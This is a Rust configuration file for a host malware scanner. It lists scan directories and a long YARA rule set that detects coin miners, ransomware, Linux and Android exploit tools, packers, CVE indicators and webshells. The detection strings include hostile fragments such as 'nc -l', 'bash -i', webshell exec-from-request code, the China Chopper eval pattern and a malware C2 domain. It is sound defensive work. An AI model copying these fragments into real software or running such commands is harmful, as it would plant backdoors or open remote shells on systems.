use serde::{Deserialize, Serialize};

// Cronjob wait interval time = 24 hours.
pub const WAIT_INTERVAL_DAILY: u64 = 3600 * 24;
pub const CACHE_SIZE: usize = 100;

// Plugin Config
pub const NAME: &str = "scanner";
pub const VERSION: &str = "3.0.0.0";

// Scanner Config
pub const LOAD_MMAP_MAX_SIZE: usize = 1024 * 1024 * 44; // scan max file size

// Cronjob Config
pub const WAIT_INTERVAL_DIR_SCAN: std::time::Duration = std::time::Duration::from_secs(1);
pub const WAIT_INTERVAL_PROC_SCAN: std::time::Duration = std::time::Duration::from_secs(2);

#[derive(Deserialize, Serialize, Debug, PartialEq)]
pub struct ScanConfig<'a> {
    pub fpath: &'a str,   // scan dir
    pub max_depth: usize, // scan dir max depth
}

// SCAN_DIR : config directory for yara scan
pub const SCAN_DIR_CONFIG: &[&ScanConfig] = &[
    &ScanConfig {
        fpath: "/bin", // scan dir
        max_depth: 1,  // scan dir max depth
    },
    &ScanConfig {
        fpath: "/sbin",
        max_depth: 1,
    },
    &ScanConfig {
        fpath: "/usr/bin",
        max_depth: 1,
    },
    &ScanConfig {
        fpath: "/usr/sbin",
        max_depth: 1,
    },
    &ScanConfig {
        fpath: "/usr/local",
        max_depth: 1,
    },
    &ScanConfig {
        fpath: "/usr/local/bin",
        max_depth: 1,
    },
    &ScanConfig {
        fpath: "/usr/local/sbin",
        max_depth: 1,
    },
    &ScanConfig {
        fpath: "/usr/local/share",
        max_depth: 1,
    },
    &ScanConfig {
        fpath: "/usr/local/sbin",
        max_depth: 1,
    },
    &ScanConfig {
        fpath: "/root",
        max_depth: 2,
    },
    &ScanConfig {
        fpath: "/root/.ssh",
        max_depth: 2,
    },
    &ScanConfig {
        fpath: "/etc",
        max_depth: 2,
    },
];

pub const SCAN_DIR_FILTER: &[&str] = &[
    // root filter
    "/root/.debug", // vscode debug at root
    "/root/.vscode",
    "/root/.bash_history",
    // file filter
    "/usr/bin/killall",
    "/usr/bin/upx",
    "/etc/alternatives/upx",
    "/etc/dictionaries-common/words",
];

// RULES_SET : yara rule sets
pub const RULES_SET: &str = r##############################################################################"
rule Multios_Coinminer_StratumIoc
{
strings:
	$a1 = "stratum+tcp"
	$a2 = "stratum+udp"
	$a3 = "stratum+ssl"
	$a4 = "ethproxy+tcp"
	$a5 = "nicehash+tcp"
condition:
	any of them
}
rule Multios_Ransome_BlackMatter
{
strings:
	$s1 = "Another Instance Currently Running..."
	$s2 = "Removing Self Executable..."
	$s3 = "web_reporter::main_sender_proc()"
	$s4 = "NO stat available for "
	$s5 = "Please, just wait..."
	$s6 = ".cfgETD"
condition:
	all of them
}
rule Multios_Coinminer_StratumProtocol
{
strings:
	$a1 = "stratum+tcp"
	$a2 = "stratum+udp"
	$a3 = "stratum+ssl"
	$a4 = "ethproxy+tcp"
	$a5 = "nicehash+tcp"
condition:
	any of them
}
rule Multios_Coinminer_MinerKeywords
{
strings:
	$m1 = "Miner"
	$m2 = "miner"
	$s1 = "Stratum"
	$s2 = "stratum"
	$e1 = "encrypt"
	$e2 = "Encrypt"
condition:
	($s1 or $s2) and ($m1 or $m2) and  ($e1 or $e2)
}
rule Multios_Coinminer_NameIoc
{
strings:
	$k01 = "_ZN5Miner"
	$k02 = "_ZN5miner"
	$k11 = "NBMiner"
	$k21 = "_ZN5xmrig"
	$k22 = "_ZN5Xmrig"
condition:
	any of them
}
rule Multios_Trojan_Stowaway
{
strings:
	$k1 = "Stowaway"
condition:
	$k1
}
rule Unix_Packer_MumblehardM1
{
strings:
	$decrypt = { 31 db  [1-10]  ba ?? 00 00 00  [0-10]  (56 5f | 89 F7) 39 d3 75 13 81 fa ?? (00 | 01) 00 00 75 02 31 d2 81 c2 ?? 00 00 00 31 db 43 ac 30 d8 aa 43 e2 e2 }
condition:
	$decrypt
}
rule Unix_Spyware_Suspicious_script
{
strings:
	$kill1 = "kill -9"
	$kill2 = "killall"
	$kill3 = "pkill -f"
	$remove1 = "rm -f"
	$remove2 = "rm -rf"
	$download1 = "wget "
	$download2 = "curl "
	$download3 = "tftp "
	$iptables1 = "iptables -A"
	$iptables2 = "iptables -F"
	$has_sensitive_file1 = "/root"
	$has_sensitive_file2 = "/etc/cron"
	$has_sensitive_file3 = "/.ssh"
	$has_sensitive_file4 = "system"
	$has_sensitive_file5 = "/usr/bin/passwd"
	$sensitive_ops1 = "chmod 777 "
	$sensitive_ops2 = "setsid"
	$sensitive_ops3 = "chattr -i"
	$sensitive_ops4 = "nohup"
	$sensitive_ops6 = "netcat -l"
	$bad_ops1 = "nc -l"
	$bad_ops2 = "bash -i"
	$sensitive_ops9 = "ulimit -n"
	$root1 = "insmod"
	$root2 = "modprobe"
	$root3 = "sysctl -w"
	$root4 = "wrmsr -a"
condition:
	uint32(0) != 0x464c457f and filesize < 256KB and ( (8 of them) or $bad_ops1 or $bad_ops2 )
}
rule Andr_Exploit_ExploitTools
{
strings:
	$s0 = "stack corruption detected: aborted" fullword ascii
	$s1 = "/proc/%d/fd/%d" fullword ascii
	$s2 = "SUCCESS: Enjoy the shell." fullword ascii
condition:
	uint16(0) == 0x457f and 2 of them
}
rule Unix_Spyware_EquationGroup_morerats_client_Store
{
strings:
	$s1 = "[-] Failed to mmap file: %s" fullword ascii
	$s2 = "[-] can not NULL terminate input data" fullword ascii
	$s3 = "Missing argument for `-x'." fullword ascii
	$s4 = "[!] Value has size of 0!" fullword ascii
condition:
	uint16(0) == 0x457f and filesize < 60KB and 2 of them
}
rule Andr_Exploit_Gingerbreak_unlocking_tools
{
strings:
	$s1 = "Android Exploid Crew."
	$s2 = "Killing ADB and restarting as root... enjoy!"
	$s3 = "GingerBread"
condition:
	uint16(0) == 0x457f and 2 of them
}
rule Andr_Exploit_Droidkungfu
{
strings:
	$s1 = "/system/bin/kill -9 %s"
	$s2 = "%s/myicon"
	$s3 = "%s/secbin"
	$s4 = "/system/bin/secbin"
condition:
	uint16(0) == 0x457f and all of them
}
rule Unix_Exploit_PsyBNC
{
strings:
	$s1 = "psychoid Exp"
	$s2 = "(%s)!psyBNC@lam3rz.de PRIVMSG %s :%s"
condition:
	uint16(0) == 0x457f and all of them
}
rule Andr_Exploit_ToolsZerglings
{
strings:
	$s0 = "Overseer found a path ! 0x%08x" fullword ascii
	$s1 = "Killing ADB and restarting as root... enjoy!" fullword ascii
	$s2 = "Zerglings" fullword ascii
condition:
	uint16(0) == 0x457f and 2 of them
}
rule Unix_Spyware_Bouncer
{
strings:
	$s1 = "/shutdown_request\">Shutdown Bouncer"
	$s2 = "Bouncer Successfully Shutdown"
	$s3 = "%s Bouncer Daemonized (PID = %d)"
condition:
	uint16(0) == 0x457f and all of them
}
rule Unix_CVE_2021_40539
{
strings:
	$x1 = "/ServletApi/../RestApi/LogonCustomization" ascii wide
	$x2 = "/ServletApi/../RestAPI/Connection" ascii wide
condition:
	filesize < 50MB and 1 of them
}
rule Js_OBFUSC_SUSP_JS_Sept21_2_RID2E68
{
strings:
	$s1 = "=new RegExp(String.fromCharCode(" ascii
	$s2 = ".charCodeAt(" ascii
	$s3 = ".substr(0, " ascii
	$s4 = "var shell = new ActiveXObject(" ascii
	$s5 = "= new Date().getUTCMilliseconds();" ascii
	$s6 = ".deleteFile(WScript.ScriptFullName);" ascii
condition:
	filesize < 6000KB and ( 4 of them )
}
rule Unix_CVE_2021_26084
{
strings:
	$xr1 = /isSafeExpression Unsafe clause found in \['[^\n]{1,64}\\u0027/ ascii
	$xs1 = "[util.velocity.debug.DebugReferenceInsertionEventHandler] referenceInsert resolving reference [$!queryString]"
	$xs2 = "userName: anonymous | action: createpage-entervariables ognl.ExpressionSyntaxException: Malformed OGNL expression: '\\' [ognl.TokenMgrError: Lexical error at line 1"
	$sa1 = "GET /pages/doenterpagevariables.action"
	$sb1 = "%5c%75%30%30%32%37"
	$sb2 = "\\u0027"
	$sc1 = " ERROR "
	$sc2 = " | userName: anonymous | action: createpage-entervariables"
	$re1 = /\[confluence\.plugins\.synchrony\.SynchronyContextProvider\] getContextMap (\n )?-- url: \/pages\/createpage-entervariables\.action/
condition:
	1 of ( $x* ) or ( $sa1 and 1 of ( $sb* ) ) or ( all of ( $sc* ) and $re1 )
}
rule Multios_CVE_2021_33766
{
strings:
	$ss0 = "POST " ascii
	$ss1 = " 500 0 0"
	$sa1 = "/ecp/" ascii
	$sa2 = "/RulesEditor/InboxRules.svc/NewObject" ascii
	$sb1 = "/ecp/" ascii
	$sb2 = "SecurityToken=" ascii
condition:
	all of ( $ss* ) and ( all of ( $sa* ) or all of ( $sb* ) )
}
rule Unix_Trojan_TinyShell
{
strings:
	$vara01 = { 73 3A 70 3A 00 }
	$vara02 = { 55 74 61 67 65 3A 20 25 73 }
	$vara03 = { 5B 20 2D 73 20 73 65 63 72 65 74 20 5D }
	$vara04 = { 5B 20 2D 70 20 70 6F 72 74 20 5D }
	$varb01 = { 41 57 41 56 41 55 41 54 55 53 0F B6 06 }
	$varb02 = { 48 C7 07 00 00 00 00 48 C7 47 08 00 00 }
	$vard01 = { 55 48 89 E5 41 57 41 56 41 55 41 54 53 }
	$vard02 = { 55 48 89 E5 48 C7 47 08 00 00 00 00 48 }
	$varb03 = { 89 DF E8 FB A4 FF FF 83 C3 01 81 FB 00 04 }
	$vard03 = { 66 89 05 7D 5E 00 00 }
	$vare01 = "socket"
	$vare02 = "connect"
	$vare03 = "alarm"
	$vare04 = "dup2"
	$vare05 = "execl"
	$vare06 = "openpty"
	$vare07 = "putenv"
	$vare08 = "setsid"
	$vare09 = "ttyname"
	$vare00 = "waitpid"
	$varc01 = "HISTFIL"
	$varc02 = "TERML"
	$varc03 = "/bin/sh"
condition:
	(uint16(0) == 0x457f) and (all of ($vara*)) and ( filesize > 20KB or ( filesize < 100KB and ( (2 of ($varb*) or 2 of ($vard*)) or (1 of ($varb0*)) or (5 of ($vare*) or 2 of ($varc*)) ) ) )
}
rule Unix_DDOS_Kaiten
{
strings:
	$irc = /(PING)|(PONG)|(NOTICE)|(PRIVMSG)/
	$kill = "Killing pid %d" nocase
	$subnet = "What kind of subnet address is that" nocase
	$version = /(Helel mod)|(Kaiten wa goraku)/
	$flood = "UDP <target> <port> <secs>" nocase
condition:
	uint16(0) == 0x457f and $irc and 2 of ($kill, $subnet, $version, $flood)
}
rule Unix_Malware_HttpsdARM
{
strings:
	$hexsts01 = { f0 4f 2d e9 1e db 4d e2 ec d0 4d e2 01 40 a0 e1 }
	$hexsts02 = { f0 45 2d e9 0b db 4d e2 04 d0 4d e2 3c 01 9f e5 }
	$hexsts03 = { f0 45 2d e9 01 db 4d e2 04 d0 4d e2 bc 01 9f e5 }
	$st01 = "k.conectionapis.com" fullword nocase wide ascii
	$st02 = "key=%s&host_name=%s&cpu_count=%d&os_type=%s&core_count=%s" fullword nocase wide ascii
	$st03 = "id=%d&result=%s" fullword nocase wide ascii
	$st04 = "rtime" fullword nocase wide ascii
	$st05 = "down" fullword nocase wide ascii
	$st06 = "cmd" fullword nocase wide ascii
	$st07 = "0 */6 * * * root" fullword nocase wide ascii
	$st08 = "/etc/cron.d/httpsd" fullword nocase wide ascii
	$st09 = "cat /proc/cpuinfo |grep processor|wc -l" fullword nocase wide ascii
	$st10 = "k.conectionapis.com" fullword nocase wide ascii
	$st11 = "/api" fullword nocase wide ascii
	$st12 = "/tmp/.httpslog" fullword nocase wide ascii
	$st13 = "/bin/.httpsd" fullword nocase wide ascii
	$st14 = "/tmp/.httpsd" fullword nocase wide ascii
	$st15 = "/tmp/.httpspid" fullword nocase wide ascii
	$st16 = "/tmp/.httpskey" fullword nocase wide ascii
condition:
	uint16(0) == 0x457f and filesize < 200KB and all of them
}
rule Unix_Malware_Httpsdi86
{
strings:
	$hexsts01 = { 8d 4c 24 04 83 e4 f0 ff 71 fc 55 89 e5 57 56 53 }
	$hexsts02 = { 55 89 e5 57 56 53 81 ec 14 2c 00 00 68 7a 83 05 }
	$hexsts03 = { 55 89 e5 57 56 53 81 ec 10 04 00 00 68 00 04 00 }
	$st01 = "k.conectionapis.com" fullword nocase wide ascii
	$st02 = "key=%s&host_name=%s&cpu_count=%d&os_type=%s&core_count=%s" fullword nocase wide ascii
	$st03 = "id=%d&result=%s" fullword nocase wide ascii
	$st04 = "rtime" fullword nocase wide ascii
	$st05 = "down" fullword nocase wide ascii
	$st06 = "cmd" fullword nocase wide ascii
	$st07 = "0 */6 * * * root" fullword nocase wide ascii
	$st08 = "/etc/cron.d/httpsd" fullword nocase wide ascii
	$st09 = "cat /proc/cpuinfo |grep processor|wc -l" fullword nocase wide ascii
	$st10 = "k.conectionapis.com" fullword nocase wide ascii
	$st11 = "/api" fullword nocase wide ascii
	$st12 = "/tmp/.httpslog" fullword nocase wide ascii
	$st13 = "/bin/.httpsd" fullword nocase wide ascii
	$st14 = "/tmp/.httpsd" fullword nocase wide ascii
	$st15 = "/tmp/.httpspid" fullword nocase wide ascii
	$st16 = "/tmp/.httpskey" fullword nocase wide ascii
condition:
	(uint16(0) == 0x457f) and (filesize < 200KB) and (all of them)
}
rule Unix_Packer_UpxDetail
{
strings:
	$a1 = "UPX!"
	$a2 = " UPX "
	$a3 = "!XPU"
	$h1 = { E8 ?? ?? ?? ?? 55 53 51 52 48 01 FE 56 41 ?? ?? ?? 0F 85 ?? ?? ?? ?? 55 48 89 E5 44 8B 09 49 89 D0 48 89 F2 48 8D 77 02 56 8A 07 FF CA 88 C1 }
	$h2 = { E8 ?? ?? ?? ?? 55 53 51 52 48 01 FE 56 48 89 FE 48 89 D7 31 DB 31 C9 48 83 CD FF E8 ?? ?? ?? ?? 01 DB 74 ?? F3 C3 8B 1E 48 83 EE FC 11 DB 8A }
	$h3 = { E8 ?? ?? ?? ?? EB 0E 5A 58 59 97 60 8A 54 24 20 E9 11 0B 00 00 60 8B 74 24 24 8B 7C 24 2C 83 CD FF 89 E5 8B 55 28 AC 4A 88 C1 24 07 C0 E9 03 BB 00 FD FF FF D3 E3 8D A4 5C 90 F1 FF FF 83 E4 E0 6A 00 6A }
	$h4 = { FC 41 5B 41 80 F8 ?? 74 0D E9 ?? ?? ?? ?? 48 FF C6 88 17 48 FF C7 8A 16 01 DB 75 0A 8B 1E 48 83 EE FC 11 DB 8A 16 72 E6 8D 41 01}
condition:
	uint32(0) == 0x464c457f and any of them
}
rule Unix_Malware_RebirthVulcan
{
strings:
	$spec01 = "vulcan.sh" fullword nocase wide ascii
	$spec02 = "Vulcan" fullword nocase wide ascii
	$str01 = "/usr/bin/python" fullword nocase wide ascii
	$str02 = "nameserver 8.8.8.8\nnameserver 8.8.4.4\n" fullword nocase wide ascii
	$str03 = "Telnet Range %d->%d" fullword nocase wide ascii
	$str04 = "Mirai Range %d->%d" fullword nocase wide ascii
	$str05 = "[Updating] [%s:%s]" fullword nocase wide ascii
	$str06 = "rm -rf /tmp/* /var/* /var/run/* /var/tmp/*" fullword nocase wide ascii
	$str07 = "\x1B[96m[DEVICE] \x1B[97mConnected" fullword nocase wide ascii
	$hex01 = { 0D C0 A0 E1 00 D8 2D E9 }
	$hex02 = { 3C 1C 00 06 27 9C 97 98 }
	$hex03 = { 94 21 EF 80 7C 08 02 A6 }
	$hex04 = { E6 2F 22 4F 76 91 18 3F }
	$hex05 = { 06 00 1C 3C 20 98 9C 27 }
	$hex06 = { 55 89 E5 81 EC ?? 10 00 }
	$hex07 = { 55 48 89 E5 48 81 EC 90 }
	$hex08 = { 6F 67 69 6E 00 }
	$bot01 = "MIRAITEST" fullword nocase wide ascii
	$bot02 = "TELNETTEST" fullword nocase wide ascii
	$bot03 = "UPDATE" fullword nocase wide ascii
	$bot04 = "PHONE" fullword nocase wide ascii
	$bot05 = "RANGE" fullword nocase wide ascii
	$bot06 = "KILLATTK" fullword nocase wide ascii
	$bot07 = "STD" fullword nocase wide ascii
	$bot08 = "BCM" fullword nocase wide ascii
	$bot09 = "NETIS" fullword nocase wide ascii
	$bot10 = "FASTLOAD" fullword nocase wide ascii
condition:
	uint32(0) == 0x464c457f and filesize < 300KB and all of ($spec*) and 4 of ($str*) and 2 of ($hex*) and 6 of ($bot*)
}
rule Unix_CVE_2021_38647
{
strings:
	$a1 = "/opt/omi/bin/omiagent" ascii fullword
	$s1 = "OMI-1.6.8-0 - " ascii
	$s2 = "OMI-1.6.6-0 - " ascii
	$s3 = "OMI-1.6.4-1 - " ascii
	$s4 = "OMI-1.6.4-0 - " ascii
	$s5 = "OMI-1.6.2-0 - " ascii
	$s6 = "OMI-1.6.1-0 - " ascii
	$s7 = "OMI-1.5.0-0 - " ascii
	$s8 = "OMI-1.4.4-0 - " ascii
	$s9 = "OMI-1.4.3-2 - " ascii
	$s10 = "OMI-1.4.3-1 - " ascii
	$s11 = "OMI-1.4.3-0 - " ascii
	$s12 = "OMI-1.4.2-5 - " ascii
	$s13 = "OMI-1.4.2-4 - " ascii
	$s14 = "OMI-1.4.2-3 - " ascii
	$s15 = "OMI-1.4.2-2 - " ascii
	$s16 = "OMI-1.4.2-1 - " ascii
	$s17 = "OMI-1.4.1-1 - " ascii
	$s18 = "OMI-1.4.1-0 - " ascii
	$s19 = "OMI-1.4.0-6 - " ascii
condition:
	uint32(0) == 0x464c457f and $a1 and 1 of ( $s* )
}
rule Multios_HKTL_KhepriBeaconRID3027
{
strings:
	$x1 = "NT %d.%d Build %d  ProductType:%s" ascii fullword
	$xe1 = "YzIuQ01EUEFSQU0uY21k" ascii
	$xe2 = "MyLkNNRFBBUkFNLmNtZ" ascii
	$xe3 = "jMi5DTURQQVJBTS5jbW" ascii
	$sx1 = "c2.ProcessItem.user" ascii fullword
	$sx2 = "c2.CMDPARAM.cmd" ascii fullword
	$sx3 = "c2.DownLoadFile.file_path" ascii fullword
	$sa1 = "file size zero"
	$sa2 = "cmd.exe /c "
	$sa3 = "error parse param"
	$sa4 = "innet_ip"
	$op1 = { c3 b9 b4 98 49 00 87 01 5d c3 b8 b8 98 49 00 c3 8b ff }
	$op2 = { 8b f1 80 3d 58 97 49 00 00 0f 85 96 00 00 00 33 c0 40 b9 50 97 49 00 87 01 33 db }
	$op3 = { 90 d5 0c 43 00 34 0d 43 00 ea 0c 43 00 7e 0d 43 00 b6 0d 43 00 cc }
	$op4 = { 69 c0 ff 00 00 00 8b 4d c0 23 88 40 7c 49 00 89 4d c0 8b 45 cc 0b 45 c0 89 45 cc 8b 45 d0 }
condition:
	( uint16 (0) == 0x5a4d or uint32(0) == 0x464c457f ) and filesize < 2000KB and ( 1 of ( $x* ) or 2 of ( $sx* ) or all of ( $sa* ) or 3 of ( $op* ) ) or ( filesize < 10MB and 1 of ( $xe* ) ) or 5 of them
}
rule Js_Packer_JJEncoder
{
strings:
	$jjencode = /(\$|[\S]+)=~\[\]\;(\$|[\S]+)\=\{[\_]{3}\:[\+]{2}(\$|[\S]+)\,[\$]{4}\:\(\!\[\]\+["]{2}\)[\S]+/ fullword
condition:
	$jjencode
}
rule Win_Packer_Emotet
{
strings:
	$pdb1 = "123EErrrtools.pdb"
	$pdb2 = "gGEW\\F???/.pdb"
condition:
	uint16 (0) == 0x5a4d and $pdb1 or $pdb2
}
rule Win_Packer_ZbotBanker
{
strings:
	$a = "__SYSTEM__" wide
	$b = "*tanentry*"
	$c = "*<option"
	$d = "*<select"
	$e = "*<input"
condition:
	uint16 (0) == 0x5a4d and (($a and $b) or ($c and $d and $e))
}
rule Win_Packer_BanbraBanker
{
strings:
	$a = "senha" fullword nocase
	$b = "cartao" fullword nocase
	$c = "caixa"
	$d = "login" fullword nocase
	$e = ".com.br"
condition:
	uint16 (0) == 0x5a4d and (#a > 3 and #b > 3 and #c > 3 and #d > 3 and #e > 3)
}
rule Win_Packer_Borland
{
strings:
	$patternBorland = "Borland" wide ascii
condition:
	uint16 (0) == 0x5a4d and $patternBorland
}
rule Win_Packer_EnigmaProtector1XSukhovVladimirSergeNMarkin
{
strings:
	$a0 = { 00 00 00 56 69 72 74 75 61 6C 41 6C 6C 6F 63 00 00 00 56 69 72 74 75 61 6C 46 72 65 65 00 00 00 47 65 74 4D 6F 64 75 6C 65 48 61 6E 64 6C 65 41 00 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00 00 00 45 78 69 74 50 72 6F 63 65 73 73 00 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 00 4D 65 73 73 61 67 65 42 6F 78 41 00 00 00 52 65 67 43 6C 6F 73 65 4B 65 79 00 00 00 53 79 73 46 72 65 65 53 74 72 69 6E 67 00 00 00 43 72 65 61 74 65 46 6F 6E 74 41 00 00 00 53 68 65 6C 6C 45 78 65 63 75 74 65 41 00 00 }
condition:
	uint16 (0) == 0x5a4d and $a0
}
rule Win_Packer_MSLRHv032afakePCGuard4xxemadicius
{
strings:
	$a0 = { FC 55 50 E8 00 00 00 00 5D EB 01 E3 60 E8 03 00 00 00 D2 EB 0B 58 EB 01 48 40 EB 01 35 FF E0 E7 61 58 5D EB 05 E8 EB 04 40 00 EB FA E8 0A 00 00 00 E8 EB 0C 00 00 E8 F6 FF FF FF E8 F2 FF FF FF 83 C4 08 74 04 75 02 EB 02 EB 01 81 50 E8 02 00 00 00 29 5A 58 6B C0 03 E8 02 00 00 00 29 5A 83 C4 04 58 74 04 75 02 EB 02 EB 01 81 0F 31 50 0F 31 E8 0A 00 00 00 E8 EB 0C 00 00 E8 F6 FF FF FF E8 F2 FF FF FF }
condition:
	uint16 (0) == 0x5a4d and $a0
}
rule Win_Packer_SPLayerv008
{
strings:
	$a0 = { 8D 40 00 B9 [4] 6A ?? 58 C0 0C [2] 48 [2] 66 13 F0 91 3B D9 [8] 00 00 00 00 }
condition:
	uint16 (0) == 0x5a4d and $a0
}
rule Win_Packer_DxPackV086Dxd
{
strings:
	$a0 = { 60 E8 00 00 00 00 5D 8B FD 81 ED 06 10 40 00 2B BD 94 12 40 00 81 EF 06 00 00 00 83 BD 14 13 40 00 01 0F 84 2F 01 00 00 }
condition:
	uint16 (0) == 0x5a4d and $a0
}
rule Win_Packer_AnskyaNTPackerGeneratorAnskya
{
strings:
	$a0 = { 55 8B EC 83 C4 F0 53 B8 88 1D 00 10 E8 C7 FA FF FF 6A 0A 68 20 1E 00 10 A1 14 31 00 10 50 E8 71 FB FF FF 8B D8 85 DB 74 2F 53 A1 14 31 00 10 50 E8 97 FB FF FF 85 C0 74 1F 53 A1 14 31 00 10 50 E8 5F FB FF FF 85 C0 74 0F 50 E8 5D FB FF FF 85 C0 74 05 E8 70 FC FF FF 5B E8 F2 F6 FF FF 00 00 48 45 41 52 54 }
condition:
	uint16 (0) == 0x5a4d and $a0
}
rule Win_Packer_EmbedPEV100V124cyclotron
{
strings:
	$a0 = { 00 00 00 00 [4] 00 00 00 00 00 00 00 00 [8] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 [12] 00 00 00 00 [12] 00 00 00 00 4B 45 52 4E 45 4C 33 32 2E 64 6C 6C 00 00 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00 00 00 47 65 74 4D 6F 64 75 6C 65 48 61 6E 64 6C 65 41 00 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 00 00 00 00 00 00 00 }
condition:
	uint16 (0) == 0x5a4d and $a0
}
rule Asp_Webshell_Laudanum_File
{
strings:
	$s1 = "' *** Written by Tim Medin <tim@counterhack.com>" fullword ascii
	$s2 = "Response.BinaryWrite(stream.Read)" fullword ascii
	$s3 = "Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))" fullword ascii
	$s4 = "%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%" fullword ascii
	$s5 = "set folder = fso.GetFolder(path)" fullword ascii
	$s6 = "Set file = fso.GetFile(filepath)" fullword ascii
condition:
	filesize < 30KB and uint16(0) == 0x253c and  5 of them
}
rule Asp_Webshell_Laudanum_Shell
{
strings:
	$s1 = "<form action=\"shell.asp\" method=\"POST\" name=\"shell\">" fullword ascii
	$s2 = "%ComSpec% /c dir" fullword ascii
	$s3 = "Set objCmd = wShell.Exec(cmd)" fullword ascii
	$s4 = "Server.ScriptTimeout = 180" fullword ascii
	$s5 = "cmd = Request.Form(\"cmd\")" fullword ascii
	$s6 = "' ***  http://laudanum.secureideas.net" fullword ascii
	$s7 = "Dim wshell, intReturn, strPResult" fullword ascii
condition:
	filesize < 15KB and 4 of them
}
rule Php_Webshell_Laudanum_Killnc
{
strings:
	$s1 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii
	$s2 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
	$s3 = "<?php echo exec('killall nc');?>" fullword ascii
	$s4 = "<title>Laudanum Kill nc</title>" fullword ascii
	$s5 = "foreach ($allowedIPs as $IP) {" fullword ascii
condition:
	filesize < 15KB and 4 of them
}
rule Php_Webshell_Laudanum_Settings
{
strings:
	$s1 = "Port: <input name=\"port\" type=\"text\" value=\"8888\">" fullword ascii
	$s2 = "<li>Reverse Shell - " fullword ascii
	$s3 = "<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>" ascii
condition:
	filesize < 13KB and all of them
}
rule Asp_Webshell_Laudanum_Proxy
{
strings:
	$s1 = "'response.write \"<br/>  -value:\" & request.querystring(key)(j)" fullword ascii
	$s2 = "q = q & \"&\" & key & \"=\" & request.querystring(key)(j)" fullword ascii
	$s3 = "for each i in Split(http.getAllResponseHeaders, vbLf)" fullword ascii
	$s4 = "'urlquery = mid(urltemp, instr(urltemp, \"?\") + 1)" fullword ascii
	$s5 = "s = urlscheme & urlhost & urlport & urlpath" fullword ascii
	$s6 = "Set http = Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii
condition:
	filesize < 50KB and all of them
}
rule Cfm_Webshell_Laudanum_Shell
{
strings:
	$s1 = "Executable: <Input type=\"text\" name=\"cmd\" value=\"cmd.exe\"><br>" fullword ascii
	$s2 = "<cfif ( #suppliedCode# neq secretCode )>" fullword ascii
	$s3 = "<cfif IsDefined(\"form.cmd\")>" fullword ascii
condition:
	filesize < 20KB and 2 of them
}
rule Asp_Webshell_Laudanum_Shellx
{
strings:
	$s1 = "command_hist[current_line] = document.shell.command.value;" fullword ascii
	$s2 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii
	$s3 = "array_unshift($_SESSION['history'], $command);" fullword ascii
	$s4 = "if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {"
condition:
	filesize < 40KB and all of them
}
rule Asp_Webshell_ChinaChopper
{
strings:
	$ChinaChopperASPX = {25 40 20 50 61 67 65 20 4C 61 6E 67 75 61 67 65 3D ?? 4A 73 63 72 69 70 74 ?? 25 3E 3C 25 65 76 61 6C 28 52 65 71 75 65 73 74 2E 49 74 65 6D 5B [1-100] 75 6E 73 61 66 65}
condition:
	$ChinaChopperASPX
}
rule Php_Webshell_ChinaChopper
{
strings:
	$ChinaChopperPHP = {3C 3F 70 68 70 20 40 65 76 61 6C 28 24 5F 50 4F 53 54 5B ?? 70 61 73 73 77 6F 72 64 ?? 5D 29 3B 3F 3E}
condition:
	$ChinaChopperPHP
}
rule Php_Webshell_Dotico
{
strings:
	$php = "<?php" ascii
	$regexp = /basename\/\*[a-z0-9]{,6}\*\/\(\/\*[a-z0-9]{,5}\*\/trim\/\*[a-z0-9]{,5}\*\/\(\/\*[a-z0-9]{,5}\*\//
condition:
	filesize > 70KB and $php at 0  and filesize < 110KB and $regexp
}
rule Php_Trojan_Anuna
{
strings:
	$a = /<\?php \$[a-z]+ = '/
	$b = /\$[a-z]+=explode\(chr\(\([0-9]+[-+][0-9]+\)\)/
	$c = /\$[a-z]+=\([0-9]+[-+][0-9]+\)/
	$d = /if \(!function_exists\('[a-z]+'\)\)/
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_by_string
{
strings:
	$jstring1 = "<title>Boot Shell</title>" wide ascii
	$jstring2 = "String oraPWD=\"" wide ascii
	$jstring3 = "Owned by Chinese Hackers!" wide ascii
	$jstring4 = "AntSword JSP" wide ascii
	$jstring5 = "JSP Webshell</" wide ascii
	$jstring6 = "motoME722remind2012" wide ascii
	$jstring7 = "EC(getFromBase64(toStringHex(request.getParameter(\"password" wide ascii
	$jstring8 = "http://jmmm.com/web/index.jsp" wide ascii
	$jstring9 = "list.jsp = Directory & File View" wide ascii
	$jstring10 = "jdbcRowSet.setDataSourceName(request.getParameter(" wide ascii
	$jstring11 = "Mr.Un1k0d3r RingZer0 Team" wide ascii
	$jstring12 = "MiniWebCmdShell" fullword wide ascii
	$jstring13 = "pwnshell.jsp" fullword wide ascii
	$jstring14 = "session set &lt;key&gt; &lt;value&gt; [class]<br>"  wide ascii
	$jstring15 = "Runtime.getRuntime().exec(request.getParameter(" nocase wide ascii
	$jstring16 = "GIF98a<%@page" wide ascii
	$jstring17 = "ClassLoader"
condition:
	any of ( $jstring* )
}
rule Php_Webshell_webshell_behinder
{
strings:
	$token0 = "e45e329feb5d925b"
	$token1 = "rebeyond"
condition:
	any of($token*)
}
rule Php_Webshell_webshell_php_obfuscated_tiny
{
strings:
	$obf1 = /\w'\.'\w/ ascii
	$obf2 = /\w\"\.\"\w/ ascii
	$obf3 = "].$" wide ascii
	$gfp1 = "eval(\"return [$serialised_parameter" // elgg
	$gfp2 = "$this->assert(strpos($styles, $"
	$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
	$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
	$gfp5 = "$_POST[partition_by]($_POST["
	$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
	$gfp7 = "The above example code can be easily exploited by passing in a string such as" // ... ;)
	$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
